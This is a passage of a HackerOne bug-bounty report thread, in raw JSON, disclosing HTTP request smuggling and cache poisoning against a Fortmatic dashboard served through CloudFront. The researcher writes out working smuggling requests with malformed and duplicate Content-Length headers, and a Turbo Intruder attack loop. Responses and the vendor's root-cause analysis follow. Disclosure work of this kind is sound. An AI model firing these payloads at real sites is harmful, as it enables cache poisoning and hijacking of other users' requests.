https://anima-uploads.s3.amazonaws.com/ https://www.google-analytics.com/ https://stats.g.doubleclick.net/ https://*.githubusercontent.com https://www.google.com/ data:; connect-src 'self' https://*.fortmatic.com/ https://api.segment.io/ https://api.mixpanel.com/ https://api.amplitude.com/; script-src 'self'  https://cdn.segment.com/ https://cdn.mxpnl.com/libs/mixpanel-2-latest.min.js https://www.google-analytics.com/analytics.js https://cdn.amplitude.com/; base-uri 'self';\nX-Content-Type-Options: nosniff\nX-Frame-Options: SAMEORIGIN\nX-XSS-Protection: 1; mode=block\nReferrer-Policy: strict-origin-when-cross-origin\nX-Cache: RefreshHit from cloudfront\nVia: 1.1 f713e2110e2ab0ef29a25c0a3c181edd.cloudfront.net (CloudFront)\nX-Amz-Cf-Pop: ATL52-C1\nX-Amz-Cf-Id: WtQ_5cOA4dP2pRX1OWpJUlXLbMRtja91l34SWRUY3U_GhHVO9D0qeA==\n\nHTTP/1.1 400 Bad Request\nServer: CloudFront\nDate: Thu, 12 Dec 2019 13:41:28 GMT\nContent-Type: text/html\nContent-Length: 915\nConnection: close\nX-Cache: Error from cloudfront\nVia: 1.1 f713e2110e2ab0ef29a25c0a3c181edd.cloudfront.net (CloudFront)\nX-Amz-Cf-Pop: ATL52-C1\nX-Amz-Cf-Id: Bbra2LyRJQahrwIvNOkR-vSWI55eMuiJw2XCXVVF9N6VZka6hAVTmQ==\n\n\u003c!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n```\n\nSame thing as above but i tried to achieve the same thing using double `Content-Length`\n\n```\nGET / HTTP/1.1\nHost: dashboard.fortmatic.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nDNT: 1\nUpgrade-Insecure-Requests: 1\nConnection: open\nIf-Modified-Since: Sat, 07 Dec 2019 02:01:47 GMT\nContent-Type: application/x-www-form-urlencoded\n Content-Length: 0\n Content-Length: 320\n\n0\n\nGET /login HTTP/1.1\nHost: dashboard.fortmatic.com\nX: poo\n```\n\n","markdown_message":"\u003cp\u003eLets investigate this more, it is pretty interesting that it also response to the malformed \u003ccode\u003econtent-length\u003c/code\u003e header. It seems to behave the same way as with the \u003ccode\u003eTransfer-Encoding\u003c/code\u003e header. This is highly odd behavior. \u003cbr\u003e\nLets go into some of the odd behavior here with a malformed \u003ccode\u003econtent-length\u003c/code\u003e . There are some very interesting responses here, depending on the request sent. \u003c/p\u003e\n\n\u003cp\u003eFirst i made a video below demoing all of this. We will examine a handful of request, lets answer the Turbo intruder question. The reflected request has a timing of zero, there is no delayed feedback. These request have a delayed feedback, i have had that problem before. Edit \u003ccode\u003erequestsPerConnection\u003c/code\u003e to the value 2 or great to see this affect. I would like to references the video i made demoing this. the browser i pulled up was out side of the kali. turbo intruder can\u0026#39;t affect the browser just its self. When turbo intruder errors out the time is zero. \u003c/p\u003e\n\n\u003cp\u003eNow to the request, I will start from a basic request with nothing then build up from that. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET / HTTP/1.1\nHost: dashboard.fortmatic.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://dashboard.fortmatic.com/\nDNT: 1\nConnection: close\nCookie: *\nUpgrade-Insecure-Requests: 1\nIf-Modified-Since: Sat, 07 Dec 2019 02:01:47 GMT\nContent-Type: application/x-www-form-urlencoded\n Content-Length: 0\n\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eResponses View image responses1.png, first thing i noticed here was the that the resposnes had the \u003ccode\u003eTransfer-Encoding\u003c/code\u003e header, the nexxt thing was \u003ccode\u003eX-Cache: Hit from Cloudfront\u003c/code\u003e . So we have a cached response and the response includes \u003ccode\u003eTransfer-Encoding\u003c/code\u003e header I believe should be there.  I edited out some junk from the response.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 403 Forbidden\nContent-Type: application/xml\nTransfer-Encoding: chunked\nConnection: keep-alive\nDate: Thu, 12 Dec 2019 13:32:10 GMT\nServer: AmazonS3\nStrict-Transport-Security: max-age=63072000; includeSubdomains; preload\nContent-Security-Policy: default-src\nX-Content-Type-Options: nosniff\nX-Frame-Options: SAMEORIGIN\nX-XSS-Protection: 1; mode=block\nReferrer-Policy: strict-origin-when-cross-origin\nX-Cache: Hit from cloudfront\nVia: 1.1 81967fd0988948662c44f29b5412bafe.cloudfront.net (CloudFront)\nX-Amz-Cf-Pop: ATL50-C1\nX-Amz-Cf-Id: tGn5gspr_AeecYCTjDebRhS7kAWIHEW2kFyBIrPwe3eV_xyFTxTAVA==\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFor the next request lets add something to the body of the request placing a non hex character for example \u003ccode\u003eG\u003c/code\u003e in the body returns the same of as above. Now add a \u003ccode\u003e0\u003c/code\u003e to start a new request and a \u003ccode\u003eF\u003c/code\u003e. This was when it got weird, The response returned a split request. Two responses in one request. The cache returned a error \u003ccode\u003eX-Cache: RefreshHit from cloudfront\u003c/code\u003e and the \u003ccode\u003eTransfer-Encoding\u003c/code\u003e header is gone as well. Doing this test i was able to get 200 response and 304 response codes the picture only has the 304 and 403. \u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eREQUEST:\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET / HTTP/1.1\nHost: dashboard.fortmatic.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://dashboard.fortmatic.com/\nDNT: 1\nConnection: keep-alive\nCookie: *\nUpgrade-Insecure-Requests: 1\nIf-Modified-Since: Sat, 07 Dec 2019 02:01:47 GMT\nContent-Type: application/x-www-form-urlencoded\n Content-Length: 6\n\n0\n\nF\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eRESPONSE\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 304 Not Modified\nConnection: keep-alive\nDate: Thu, 12 Dec 2019 13:41:29 GMT\nLast-Modified: Sat, 07 Dec 2019 02:01:47 GMT\nETag: \u0026quot;5df631e1fe4774958c055af2066d43ec\u0026quot;\nServer: AmazonS3\nStrict-Transport-Security: max-age=63072000; includeSubdomains; preload\nContent-Security-Policy: default-src \u0026#39;self\u0026#39;;style-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39;; frame-src https://*.fortmatic.com/ https://fortmatic.github.io/ blob: https://x2.fortmatic.com; img-src \u0026#39;self\u0026#39; https://*.fortmatic.com/ https://fortmatic.github.io/ https://anima-uploads.s3.amazonaws.com/ https://www.google-analytics.com/ https://stats.g.doubleclick.net/ https://*.githubusercontent.com https://www.google.com/ data:; connect-src \u0026#39;self\u0026#39; https://*.fortmatic.com/ https://api.segment.io/ https://api.mixpanel.com/ https://api.amplitude.com/; script-src \u0026#39;self\u0026#39;  https://cdn.segment.com/ https://cdn.mxpnl.com/libs/mixpanel-2-latest.min.js https://www.google-analytics.com/analytics.js https://cdn.amplitude.com/; base-uri \u0026#39;self\u0026#39;;\nX-Content-Type-Options: nosniff\nX-Frame-Options: SAMEORIGIN\nX-XSS-Protection: 1; mode=block\nReferrer-Policy: strict-origin-when-cross-origin\nX-Cache: RefreshHit from cloudfront\nVia: 1.1 f713e2110e2ab0ef29a25c0a3c181edd.cloudfront.net (CloudFront)\nX-Amz-Cf-Pop: ATL52-C1\nX-Amz-Cf-Id: WtQ_5cOA4dP2pRX1OWpJUlXLbMRtja91l34SWRUY3U_GhHVO9D0qeA==\n\nHTTP/1.1 400 Bad Request\nServer: CloudFront\nDate: Thu, 12 Dec 2019 13:41:28 GMT\nContent-Type: text/html\nContent-Length: 915\nConnection: close\nX-Cache: Error from cloudfront\nVia: 1.1 f713e2110e2ab0ef29a25c0a3c181edd.cloudfront.net (CloudFront)\nX-Amz-Cf-Pop: ATL52-C1\nX-Amz-Cf-Id: Bbra2LyRJQahrwIvNOkR-vSWI55eMuiJw2XCXVVF9N6VZka6hAVTmQ==\n\n\u0026lt;!DOCTYPE HTML PUBLIC \u0026quot;-//W3C//DTD HTML 4.01 Transitional//EN\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSame thing as above but i tried to achieve the same thing using double \u003ccode\u003eContent-Length\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET / HTTP/1.1\nHost: dashboard.fortmatic.com\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nDNT: 1\nUpgrade-Insecure-Requests: 1\nConnection: open\nIf-Modified-Since: Sat, 07 Dec 2019 02:01:47 GMT\nContent-Type: application/x-www-form-urlencoded\n Content-Length: 0\n Content-Length: 320\n\n0\n\nGET /login HTTP/1.1\nHost: dashboard.fortmatic.com\nX: poo\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-12-12T17:17:18.583Z","updated_at":"2019-12-12T17:17:18.583Z","actor":{"username":"pwny_sec","cleared":false,"url":"/pwny_sec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NArGP2CY5FG6RbFywHFAjVSk/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6534638,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"if you want to test for te:cl without it prefixing, and adding a new line\n```\n    for z in range(1000):\n      chunk_size = hex(len(prefix)).lstrip(\"0x\")\n      attack = target.req.replace('0\\r\\n\\r\\n', chunk_size+'\\r\\r0\\r\\n\\r\\n')\n      content_length = re.search('Content-Length: ([\\d]+)', attack).group(1)\n      attack = attack.replace('Content-Length: '+content_length, 'Content-length: '+str(int(content_length)+len(chunk_size)-0))\n      engine.queue(attack)\n\n      for i in range(3):\n          engine.queue(attack)\n          time.sleep(0.25)\n```","markdown_message":"\u003cp\u003eif you want to test for te:cl without it prefixing, and adding a new line\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e    for z in range(1000):\n      chunk_size = hex(len(prefix)).lstrip(\u0026quot;0x\u0026quot;)\n      attack = target.req.replace(\u0026#39;0\\r\\n\\r\\n\u0026#39;, chunk_size+\u0026#39;\\r\\r0\\r\\n\\r\\n\u0026#39;)\n      content_length = re.search(\u0026#39;Content-Length: ([\\d]+)\u0026#39;, attack).group(1)\n      attack = attack.replace(\u0026#39;Content-Length: \u0026#39;+content_length, \u0026#39;Content-length: \u0026#39;+str(int(content_length)+len(chunk_size)-0))\n      engine.queue(attack)\n\n      for i in range(3):\n          engine.queue(attack)\n          time.sleep(0.25)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-12-12T17:23:22.086Z","updated_at":"2019-12-12T17:23:22.086Z","actor":{"username":"pwny_sec","cleared":false,"url":"/pwny_sec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NArGP2CY5FG6RbFywHFAjVSk/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6534863,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-12T18:03:30.283Z","updated_at":"2019-12-12T18:03:30.283Z","additional_data":{"added_weaknesses":[{"id":86,"name":"HTTP Request Smuggling"}],"removed_weaknesses":[]},"actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6534889,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"There is defiently cache poisoning happening. I'm not sure as to why transfer-encoding is reflected back when there is no `transfer-encoding` in the request headers","markdown_message":"\u003cp\u003eThere is defiently cache poisoning happening. I\u0026#39;m not sure as to why transfer-encoding is reflected back when there is no \u003ccode\u003etransfer-encoding\u003c/code\u003e in the request headers\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-12T18:05:11.776Z","updated_at":"2019-12-12T18:05:11.776Z","actor":{"username":"pwny_sec","cleared":false,"url":"/pwny_sec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NArGP2CY5FG6RbFywHFAjVSk/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6535092,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ill make a video and upload it if its needed, just let me know","markdown_message":"\u003cp\u003eIll make a video and upload it if its needed, just let me know\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-12T18:37:05.303Z","updated_at":"2019-12-12T18:41:06.799Z","actor":{"username":"pwny_sec","cleared":false,"url":"/pwny_sec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/NArGP2CY5FG6RbFywHFAjVSk/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":657997,"filename":"responses1.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/R1RPNMyt5YZk8VF7m41TGzQq?response-content-disposition=attachment%3B%20filename%3D%22responses1.png%22%3B%20filename%2A%3DUTF-8%27%27responses1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYENXQUKC%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064655Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHXwr%2Bz%2B7j54GXjIZDeFjE7V4KhtcLVpveDKyRp%2FgHMpAiEA%2FzBLaI4tlPUnNvgzY0X8n68OkDDLSfCBmjTZSd2A%2BM8qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDOLyu53NKIhzdiDnLyqRA1YiznmwUquOZL6cfEwHlrCEbfV1uip5mxrCKpzmpc9DKyYejzEqNMg8%2Fo1XQZiQbQ9Mn8QGMjtqUBvpzsRmfLsdw4KO6Yix26%2Foq9H6jcEfUIX3EyFaY0ofGk42HT5lnakJ%2FUAtv5lyqirA3laDcoq6u60WpxBZh0jLi92Ajs9kGkzDbgWJPXMK2%2FlVglZWa%2BjQNhDftrEqJh4ZV%2FIwfbcJ6s89eju9B4Xkun1IUiVjrUtA5LTMlkDAEwqtGdl3pucepUSB2hZBvbqUfgiT65T%2BpLDNg0LFqEXPPPqqyrYG3%2BqTXIZxR1FfbdXOQjx1UoPwboCHOwSOpOKGaPs6TEM2o6Sg2U%2BGvuy3dMdtNBCfH4SIfBdeUa84eWUftCR4OwBiC0F1Cl6iPIZXa92zkJSAVTz9swPvr%2BghYLYGIjX%2F8jqVGlADsLB1sl%2BqlNRFkwYrvTDOWwnYmDuvQmmhpAQ6Mg%2Fp05v07WKHRsbG%2BAUzVJ3M02i0HIdWCGKjqKXgGZi%2FLBrHUEV9bzaVWmpeFEE3MObUqv8FOusBMEus3670kEKa62xVKQkID%2Fav5Xylzf384wPv9i4fBKmwghqKR67wSDPkErUtnTlN6wJNos0uBd5jibop6zjPh%2BDMaeI%2Bt4z0CbNpMS83WKn2xS%2FvSK0QFyg217PkDWCKklNPmbumtDteHdU2qRRX%2BQwVoTBmoRFgs97OyKXEz2rc7ZIcHuDnAibsNVPNZEuX9m%2B04KKBBkwdIr0sY3zEiVHvTVxPYBSsKfBPuZwzi6W3T3aq%2BF9l860FnFBaV964%2BlbASqZkuTd4cEZ8C2GJad6RyY164GfHgpKnmQ6aYbLhiDTz0xF3adlmhg%3D%3D\u0026X-Amz-Signature=d846758e54508f906c8699139baa1aa1ec32285379dc3515ac295ec6050e002d"},{"id":657996,"filename":"responses2.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jZJgNf2YCHrARVDqub6VGJWT?response-content-disposition=attachment%3B%20filename%3D%22responses2.png%22%3B%20filename%2A%3DUTF-8%27%27responses2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYENXQUKC%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064655Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHXwr%2Bz%2B7j54GXjIZDeFjE7V4KhtcLVpveDKyRp%2FgHMpAiEA%2FzBLaI4tlPUnNvgzY0X8n68OkDDLSfCBmjTZSd2A%2BM8qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDOLyu53NKIhzdiDnLyqRA1YiznmwUquOZL6cfEwHlrCEbfV1uip5mxrCKpzmpc9DKyYejzEqNMg8%2Fo1XQZiQbQ9Mn8QGMjtqUBvpzsRmfLsdw4KO6Yix26%2Foq9H6jcEfUIX3EyFaY0ofGk42HT5lnakJ%2FUAtv5lyqirA3laDcoq6u60WpxBZh0jLi92Ajs9kGkzDbgWJPXMK2%2FlVglZWa%2BjQNhDftrEqJh4ZV%2FIwfbcJ6s89eju9B4Xkun1IUiVjrUtA5LTMlkDAEwqtGdl3pucepUSB2hZBvbqUfgiT65T%2BpLDNg0LFqEXPPPqqyrYG3%2BqTXIZxR1FfbdXOQjx1UoPwboCHOwSOpOKGaPs6TEM2o6Sg2U%2BGvuy3dMdtNBCfH4SIfBdeUa84eWUftCR4OwBiC0F1Cl6iPIZXa92zkJSAVTz9swPvr%2BghYLYGIjX%2F8jqVGlADsLB1sl%2BqlNRFkwYrvTDOWwnYmDuvQmmhpAQ6Mg%2Fp05v07WKHRsbG%2BAUzVJ3M02i0HIdWCGKjqKXgGZi%2FLBrHUEV9bzaVWmpeFEE3MObUqv8FOusBMEus3670kEKa62xVKQkID%2Fav5Xylzf384wPv9i4fBKmwghqKR67wSDPkErUtnTlN6wJNos0uBd5jibop6zjPh%2BDMaeI%2Bt4z0CbNpMS83WKn2xS%2FvSK0QFyg217PkDWCKklNPmbumtDteHdU2qRRX%2BQwVoTBmoRFgs97OyKXEz2rc7ZIcHuDnAibsNVPNZEuX9m%2B04KKBBkwdIr0sY3zEiVHvTVxPYBSsKfBPuZwzi6W3T3aq%2BF9l860FnFBaV964%2BlbASqZkuTd4cEZ8C2GJad6RyY164GfHgpKnmQ6aYbLhiDTz0xF3adlmhg%3D%3D\u0026X-Amz-Signature=5973b41e308ad778030c3d4dacb8e3580d5951724e91b16a685d9d5ddbc27359"},{"id":657995,"filename":"two-request.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/616ZzyDvfxdHUgfhJR7rxhYy?response-content-disposition=attachment%3B%20filename%3D%22two-request.png%22%3B%20filename%2A%3DUTF-8%27%27two-request.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYENXQUKC%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064655Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHXwr%2Bz%2B7j54GXjIZDeFjE7V4KhtcLVpveDKyRp%2FgHMpAiEA%2FzBLaI4tlPUnNvgzY0X8n68OkDDLSfCBmjTZSd2A%2BM8qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDOLyu53NKIhzdiDnLyqRA1YiznmwUquOZL6cfEwHlrCEbfV1uip5mxrCKpzmpc9DKyYejzEqNMg8%2Fo1XQZiQbQ9Mn8QGMjtqUBvpzsRmfLsdw4KO6Yix26%2Foq9H6jcEfUIX3EyFaY0ofGk42HT5lnakJ%2FUAtv5lyqirA3laDcoq6u60WpxBZh0jLi92Ajs9kGkzDbgWJPXMK2%2FlVglZWa%2BjQNhDftrEqJh4ZV%2FIwfbcJ6s89eju9B4Xkun1IUiVjrUtA5LTMlkDAEwqtGdl3pucepUSB2hZBvbqUfgiT65T%2BpLDNg0LFqEXPPPqqyrYG3%2BqTXIZxR1FfbdXOQjx1UoPwboCHOwSOpOKGaPs6TEM2o6Sg2U%2BGvuy3dMdtNBCfH4SIfBdeUa84eWUftCR4OwBiC0F1Cl6iPIZXa92zkJSAVTz9swPvr%2BghYLYGIjX%2F8jqVGlADsLB1sl%2BqlNRFkwYrvTDOWwnYmDuvQmmhpAQ6Mg%2Fp05v07WKHRsbG%2BAUzVJ3M02i0HIdWCGKjqKXgGZi%2FLBrHUEV9bzaVWmpeFEE3MObUqv8FOusBMEus3670kEKa62xVKQkID%2Fav5Xylzf384wPv9i4fBKmwghqKR67wSDPkErUtnTlN6wJNos0uBd5jibop6zjPh%2BDMaeI%2Bt4z0CbNpMS83WKn2xS%2FvSK0QFyg217PkDWCKklNPmbumtDteHdU2qRRX%2BQwVoTBmoRFgs97OyKXEz2rc7ZIcHuDnAibsNVPNZEuX9m%2B04KKBBkwdIr0sY3zEiVHvTVxPYBSsKfBPuZwzi6W3T3aq%2BF9l860FnFBaV964%2BlbASqZkuTd4cEZ8C2GJad6RyY164GfHgpKnmQ6aYbLhiDTz0xF3adlmhg%3D%3D\u0026X-Amz-Signature=5cac39569a9e82df8bdd1a3d1a7b53eec758cf2338b17ec63501cdfca80b728f"}],"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6546074,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @pwny_sec been looking into this some more, dropping some more of my investigation in here.\n\n\u003eWhy does it respond with a forbidden? I tested this on some cloudfront customers work with hackerone. I tested this on slack they return the 403 but the cache isn't poisoned nor does it return the signing error. I believe there is a error between your backend and cloudfront that is causing the cache to be poisoned. Somewhere between the hmac validation that's causing this error. It does not appear to be cloud-fronts fault.\n\nI think this is something that is unique in the way we use cloudfront to serve content from S3. When cloudfront receives a 403 from s3 it will redirect the call back to s3 for the index.html path. This is so that react router can internally route the request to resources that may not exist on s3. Notice that in the 403 responses the server header is `Amazon S3`, where as if we were to try the same calls the server would be `CloudFront`.\n\nI've done some testing in a replica internal environment where I was the sole accessor to the site. I've attached a video to this post where I was able to receive a 200 response in intruder, while not receiving a 403 in the browser. Also vice-versa where the browser returned a 403, but intruder did not register a reflected 200.\n\nBased on these experiments, it does seem like CloudFront as a result of our 403 redirect rules will occasionally serve cached content. This manifests in a potential user receiving a 403 page, or the attacker receiving a 200 repsonse. Our CloudFront policy has it not caching content ever, but it seems to slip by occasionally. ","markdown_message":"\u003cp\u003eHey \u003ca href=\"/pwny_sec\"\u003e@pwny_sec\u003c/a\u003e been looking into this some more, dropping some more of my investigation in here.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eWhy does it respond with a forbidden? I tested this on some cloudfront customers work with hackerone. I tested this on slack they return the 403 but the cache isn\u0026#39;t poisoned nor does it return the signing error. I believe there is a error between your backend and cloudfront that is causing the cache to be poisoned. Somewhere between the hmac validation that\u0026#39;s causing this error. It does not appear to be cloud-fronts fault.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eI think this is something that is unique in the way we use cloudfront to serve content from S3. When cloudfront receives a 403 from s3 it will redirect the call back to s3 for the index.html path. This is so that react router can internally route the request to resources that may not exist on s3. Notice that in the 403 responses the server header is \u003ccode\u003eAmazon S3\u003c/code\u003e, where as if we were to try the same calls the server would be \u003ccode\u003eCloudFront\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve done some testing in a replica internal environment where I was the sole accessor to the site. I\u0026#39;ve attached a video to this post where I was able to receive a 200 response in intruder, while not receiving a 403 in the browser. Also vice-versa where the browser returned a 403, but intruder did not register a reflected 200.\u003c/p\u003e\n\n\u003cp\u003eBased on these experiments, it does seem like CloudFront as a result of our 403 redirect rules will occasionally serve cached content. This manifests in a potential user receiving a 403 page, or the attacker receiving a 200 repsonse. Our CloudFront policy has it not caching content ever, but it seems to slip by occasionally. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-13T23:32:49.732Z","updated_at":"2019-12-13T23:32:49.732Z","actor":{"username":"d9chen","cleared":false,"url":"/d9chen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":659138,"filename":"forpwny_sec.mov","type":"video/quicktime","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qCAyZwrM6DQrm4ASuW6fHrME?response-content-disposition=attachment%3B%20filename%3D%22forpwny_sec.mov%22%3B%20filename%2A%3DUTF-8%27%27forpwny_sec.mov\u0026response-content-type=video%2Fquicktime\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYENXQUKC%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064655Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHXwr%2Bz%2B7j54GXjIZDeFjE7V4KhtcLVpveDKyRp%2FgHMpAiEA%2FzBLaI4tlPUnNvgzY0X8n68OkDDLSfCBmjTZSd2A%2BM8qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDOLyu53NKIhzdiDnLyqRA1YiznmwUquOZL6cfEwHlrCEbfV1uip5mxrCKpzmpc9DKyYejzEqNMg8%2Fo1XQZiQbQ9Mn8QGMjtqUBvpzsRmfLsdw4KO6Yix26%2Foq9H6jcEfUIX3EyFaY0ofGk42HT5lnakJ%2FUAtv5lyqirA3laDcoq6u60WpxBZh0jLi92Ajs9kGkzDbgWJPXMK2%2FlVglZWa%2BjQNhDftrEqJh4ZV%2FIwfbcJ6s89eju9B4Xkun1IUiVjrUtA5LTMlkDAEwqtGdl3pucepUSB2hZBvbqUfgiT65T%2BpLDNg0LFqEXPPPqqyrYG3%2BqTXIZxR1FfbdXOQjx1UoPwboCHOwSOpOKGaPs6TEM2o6Sg2U%2BGvuy3dMdtNBCfH4SIfBdeUa84eWUftCR4OwBiC0F1Cl6iPIZXa92zkJSAVTz9swPvr%2BghYLYGIjX%2F8jqVGlADsLB1sl%2BqlNRFkwYrvTDOWwnYmDuvQmmhpAQ6Mg%2Fp05v07WKHRsbG%2BAUzVJ3M02i0HIdWCGKjqKXgGZi%2FLBrHUEV9bzaVWmpeFEE3MObUqv8FOusBMEus3670kEKa62xVKQkID%2Fav5Xylzf384wPv9i4fBKmwghqKR67wSDPkErUtnTlN6wJNos0uBd5jibop6zjPh%2BDMaeI%2Bt4z0CbNpMS83WKn2xS%2FvSK0QFyg217PkDWCKklNPmbumtDteHdU2qRRX%2BQwVoTBmoRFgs97OyKXEz2rc7ZIcHuDnAibsNVPNZEuX9m%2B04KKBBkwdIr0sY3zEiVHvTVxPYBSsKfBPuZwzi6W3T3aq%2BF9l860FnFBaV964%2BlbASqZkuTd4cEZ8C2GJad6RyY164GfHgpKnmQ6aYbLhiDTz0xF3adlmhg%3D%3D\u0026X-Amz-Signature=13e5e3f7226bb371530c4d2db4ea04209a1899c4126b18fd451a4208f34a57f9"}],"genius_execution_id":null,"team_handle":"fortmatic_inc","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6548358,"is_